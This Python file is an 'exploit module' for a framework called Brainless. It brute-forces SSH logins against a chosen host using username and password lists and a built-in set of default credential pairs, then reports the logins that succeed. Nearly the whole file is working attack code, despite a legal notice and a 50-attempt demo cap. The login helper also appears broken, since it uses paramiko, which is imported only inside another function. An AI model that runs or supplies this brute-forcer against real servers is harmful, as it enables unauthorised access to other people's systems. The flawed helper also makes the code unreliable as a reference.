"""
Brainless Framework - Weak SSH Exploit Module
==============================================

Example exploit module for demonstrating Brainless Framework capabilities.
This module attempts to exploit weak SSH credentials using common username/password combinations.

⚠️ Legal Notice: This module is for educational and authorized testing purposes only.
Unauthorized use against systems you do not own or have permission to test is illegal.

Module Information:
- NAME: SSH Weak Credentials Scanner
- DESCRIPTION: Attempts to authenticate to SSH servers using common credentials
- AUTHOR: Brainless Security Team
- TYPE: exploit
- TARGET: Linux/Unix SSH servers with weak credentials
"""

# Module metadata (required)
NAME = "SSH Weak Credentials Scanner"
DESCRIPTION = "Attempts to authenticate to SSH servers using common credentials"
AUTHOR = "Brainless Security Team"
VERSION = "1.0"
RANK = "normal"  # Module reliability ranking

# Module options
OPTIONS = {
    'RHOST': {
        'description': 'Target hostname or IP address',
        'required': True,
        'default': None
    },
    'RPORT': {
        'description': 'Target SSH port',
        'required': False,
        'default': 22
    },
    'USER_FILE': {
        'description': 'File containing usernames to try',
        'required': False,
        'default': 'data/usernames.txt'
    },
    'PASS_FILE': {
        'description': 'File containing passwords to try',
        'required': False,
        'default': 'data/passwords.txt'
    },
    'TIMEOUT': {
        'description': 'Connection timeout in seconds',
        'required': False,
        'default': 10
    },
    'VERBOSE': {
        'description': 'Enable verbose output',
        'required': False,
        'default': False
    }
}


def get_options():
    """Return module options"""
    return OPTIONS


def set_option(option_name, value):
    """Set a module option"""
    if option_name in OPTIONS:
        OPTIONS[option_name]['default'] = value
        return True
    return False


def run(options=None):
    """
    Main module execution function
    
    Args:
        options (dict): Module options
        
    Returns:
        dict: Execution results
    """
    import paramiko
    import socket
    import time
    
    # Use provided options or module defaults
    if options is None:
        options = {}
    
    # Get options with defaults
    rhost = options.get('RHOST') or OPTIONS['RHOST']['default']
    rport = int(options.get('RPORT') or OPTIONS['RPORT']['default'])
    user_file = options.get('USER_FILE') or OPTIONS['USER_FILE']['default']
    pass_file = options.get('PASS_FILE') or OPTIONS['PASS_FILE']['default']
    timeout = int(options.get('TIMEOUT') or OPTIONS['TIMEOUT']['default'])
    verbose = options.get('VERBOSE') or OPTIONS['VERBOSE']['default']
    
    # Validate required options
    if not rhost:
        print("[-] Error: RHOST is required")
        return {'success': False, 'error': 'RHOST is required'}
    
    print(f"[*] Starting SSH weak credentials scan against {rhost}:{rport}")
    print(f"[*] Using username file: {user_file}")
    print(f"[*] Using password file: {pass_file}")
    
    # Load usernames
    try:
        with open(user_file, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        print(f"[*] Loaded {len(usernames)} usernames")
    except FileNotFoundError:
        print(f"[-] Username file not found: {user_file}")
        usernames = ['admin', 'root', 'user', 'test', 'guest']
        print(f"[*] Using default usernames: {usernames}")
    
    # Load passwords
    try:
        with open(pass_file, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
        print(f"[*] Loaded {len(passwords)} passwords")
    except FileNotFoundError:
        print(f"[-] Password file not found: {pass_file}")
        passwords = ['password', '123456', 'admin', 'root', 'test', 'guest', 'toor']
        print(f"[*] Using default passwords: {passwords}")
    
    # Common credential combinations to try first
    common_combinations = [
        ('root', 'toor'),
        ('admin', 'admin'),
        ('root', 'root'),
        ('user', 'user'),
        ('test', 'test'),
        ('guest', 'guest')
    ]
    
    successful_logins = []
    attempts = 0
    
    # Try common combinations first
    print("[*] Trying common credential combinations...")
    for username, password in common_combinations:
        if _try_ssh_login(rhost, rport, username, password, timeout, verbose):
            successful_logins.append((username, password))
            print(f"[+] SUCCESS: {username}:{password}")
        
        attempts += 1
        time.sleep(0.1)  # Small delay between attempts
    
    # Try all combinations if no success with common ones
    if not successful_logins:
        print("[*] Trying all username/password combinations...")
        for username in usernames:
            for password in passwords:
                # Skip if already found
                if (username, password) in successful_logins:
                    continue
                
                if _try_ssh_login(rhost, rport, username, password, timeout, verbose):
                    successful_logins.append((username, password))
                    print(f"[+] SUCCESS: {username}:{password}")
                
                attempts += 1
                
                # Limit attempts for demo
                if attempts >= 50:
                    print("[*] Limiting attempts for demo purposes")
                    break
            
            if attempts >= 50:
                break
    
    # Report results
    if successful_logins:
        print(f"\n[+] Found {len(successful_logins)} successful login(s):")
        for username, password in successful_logins:
            print(f"    {username}:{password}")
        
        return {
            'success': True,
            'target': f"{rhost}:{rport}",
            'successful_logins': successful_logins,
            'total_attempts': attempts
        }
    else:
        print(f"\n[-] No successful logins found after {attempts} attempts")
        return {
            'success': False,
            'target': f"{rhost}:{rport}",
            'total_attempts': attempts,
            'error': 'No valid credentials found'
        }


def _try_ssh_login(host, port, username, password, timeout, verbose=False):
    """
    Attempt to login to SSH server
    
    Args:
        host (str): Target host
        port (int): Target port
        username (str): Username to try
        password (str): Password to try
        timeout (int): Connection timeout
        verbose (bool): Enable verbose output
    
    Returns:
        bool: True if login successful, False otherwise
    """
    try:
        # Create SSH client
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Attempt connection
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout,
            auth_timeout=timeout
        )
        
        # If we get here, login was successful
        client.close()
        
        if verbose:
            print(f"[+] Valid credentials: {username}:{password}")
        
        return True
        
    except paramiko.AuthenticationException:
        # Invalid credentials
        if verbose:
            print(f"[-] Invalid: {username}:{password}")
        return False
    
    except paramiko.SSHException as e:
        # SSH protocol error
        if verbose:
            print(f"[*] SSH error for {username}:{password}: {e}")
        return False
    
    except socket.timeout:
        # Connection timeout
        if verbose:
            print(f"[*] Timeout for {username}:{password}")
        return False
    
    except Exception as e:
        # Other connection errors
        if verbose:
            print(f"[*] Connection error for {username}:{password}: {e}")
        return False


# Additional helper functions can be added here
def check_ssh_service(host, port=22, timeout=5):
    """
    Check if SSH service is running on the target
    
    Args:
        host (str): Target host
        port (int): Target port
        timeout (int): Connection timeout
    
    Returns:
        bool: True if SSH service detected, False otherwise
    """
    import socket
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()
        
        if result == 0:
            # Try to read SSH banner
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                
                if 'SSH' in banner:
                    return True
            except:
                pass
        
        return False
        
    except Exception:
        return False


if __name__ == "__main__":
    # This allows the module to be run directly for testing
    print("This module is designed to be used within the Brainless Framework")
    print("Use: python3 brainless.py")